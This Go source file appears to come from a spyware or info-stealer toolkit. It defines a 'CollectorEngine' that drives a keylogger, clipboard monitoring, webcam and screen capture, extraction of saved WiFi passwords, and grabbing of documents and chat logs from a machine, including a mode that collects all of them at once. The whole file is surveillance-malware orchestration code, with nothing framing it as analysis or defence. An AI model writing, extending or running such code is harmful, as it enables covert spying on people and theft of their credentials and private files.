package collector

import (
	"fmt"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
)

type CollectorEngine struct {
	config   *CollectorConfig
	log      *logger.Logger
	mu       sync.RWMutex
	keylog   *Keylogger
	clip     *ClipboardMonitor
	webcam   *WebcamGrabber
	wifi     *WiFiGrabber
	filegrab *FileGrabber
	results  []*CollectResult
}

func NewCollectorEngine(config *CollectorConfig) *CollectorEngine {
	if config == nil {
		config = DefaultCollectorConfig()
	}

	e := &CollectorEngine{
		config:   config,
		log:      logger.New("collector-engine", logger.LevelInfo),
		keylog:   NewKeylogger(),
		clip:     NewClipboardMonitor(),
		webcam:   NewWebcamGrabber(),
		wifi:     NewWiFiGrabber(),
		filegrab: NewFileGrabber(config),
		results:  make([]*CollectResult, 0),
	}

	e.log.Info("CollectorEngine initialized with %d categories", len(config.Categories))
	return e
}

func (e *CollectorEngine) Collect(category string) (*CollectResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.log.Info("Starting collection for category: %s", category)

	result := &CollectResult{
		Category: CollectCategory(category),
		Timestamp: time.Now(),
	}

	switch CollectCategory(category) {
	case CategoryScreen:
		screen, err := CaptureScreen()
		if err != nil {
			result.Error = err.Error()
			e.log.Error("Screen capture failed: %v", err)
		} else {
			result.Success = true
			result.Screen = screen
		}

	case CategoryKeylog:
		e.keylog.Start()
		entries := e.keylog.GetEntries()
		result.Success = true
		result.Keylog = entries

	case CategoryClipboard:
		e.clip.Start()
		content, err := e.clip.GetContent()
		if err != nil {
			result.Error = err.Error()
			e.log.Error("Clipboard capture failed: %v", err)
		} else {
			result.Success = true
			result.Clipboard = &ClipboardContent{
				Content:   content,
				Timestamp: time.Now(),
			}
		}

	case CategoryWebcam:
		webcam, err := e.webcam.Capture()
		if err != nil {
			result.Error = err.Error()
			e.log.Error("Webcam capture failed: %v", err)
		} else {
			result.Success = true
			result.Webcam = webcam
		}

	case CategoryWiFi:
		profiles, err := e.wifi.GetWiFiProfiles()
		if err != nil {
			result.Error = err.Error()
			e.log.Error("WiFi profile extraction failed: %v", err)
		} else {
			result.Success = true
			result.WiFi = profiles
		}

	case CategoryFileGrab:
		files, err := e.filegrab.GrabFiles(e.config.FilePatterns, e.config.MaxDepth)
		if err != nil {
			result.Error = err.Error()
			e.log.Error("File grab failed: %v", err)
		} else {
			result.Success = true
			result.Files = files
		}

	case "all":
		e.collectAll(result)

	default:
		return nil, fmt.Errorf("unknown category: %s", category)
	}

	e.results = append(e.results, result)
	e.log.Info("Collection completed for category: %s (success: %v)", category, result.Success)
	return result, nil
}

func (e *CollectorEngine) collectAll(result *CollectResult) {
	screen, err := CaptureScreen()
	if err == nil {
		result.Screen = screen
	}

	webcam, err := e.webcam.Capture()
	if err == nil {
		result.Webcam = webcam
	}

	profiles, err := e.wifi.GetWiFiProfiles()
	if err == nil {
		result.WiFi = profiles
	}

	files, err := e.filegrab.GrabFiles(e.config.FilePatterns, e.config.MaxDepth)
	if err == nil {
		result.Files = files
	}

	result.Success = true
}

func (e *CollectorEngine) CaptureScreen() (*ScreenCapture, error) {
	return CaptureScreen()
}

func (e *CollectorEngine) RecordScreen(duration time.Duration) (*ScreenRecord, error) {
	return RecordScreen(duration)
}

func (e *CollectorEngine) StartKeylogger() error {
	return e.keylog.Start()
}

func (e *CollectorEngine) StopKeylogger() error {
	return e.keylog.Stop()
}

func (e *CollectorEngine) GetKeylog() []KeylogEntry {
	return e.keylog.GetEntries()
}

func (e *CollectorEngine) StartClipboard() error {
	return e.clip.Start()
}

func (e *CollectorEngine) StopClipboard() error {
	return e.clip.Stop()
}

func (e *CollectorEngine) GetClipboard() (string, error) {
	return e.clip.GetContent()
}

func (e *CollectorEngine) CaptureWebcam() (*WebcamCapture, error) {
	return e.webcam.Capture()
}

func (e *CollectorEngine) GetWiFiProfiles() ([]WiFiProfile, error) {
	return e.wifi.GetWiFiProfiles()
}

func (e *CollectorEngine) GetWiFiPassword(ssid string) (string, error) {
	return e.wifi.GetWiFiPassword(ssid)
}

func (e *CollectorEngine) GrabFiles(patterns []string, maxDepth int) ([]FileInfo, error) {
	return e.filegrab.GrabFiles(patterns, maxDepth)
}

func (e *CollectorEngine) GrabDocuments() ([]FileInfo, error) {
	return e.filegrab.GrabDocuments()
}

func (e *CollectorEngine) GrabChatLogs() ([]FileInfo, error) {
	return e.filegrab.GrabChatLogs()
}

func (e *CollectorEngine) GetResults() []*CollectResult {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make([]*CollectResult, len(e.results))
	copy(result, e.results)
	return result
}

func (e *CollectorEngine) SetLoggerLevel(level logger.Level) {
	e.log.SetLevel(level)
}
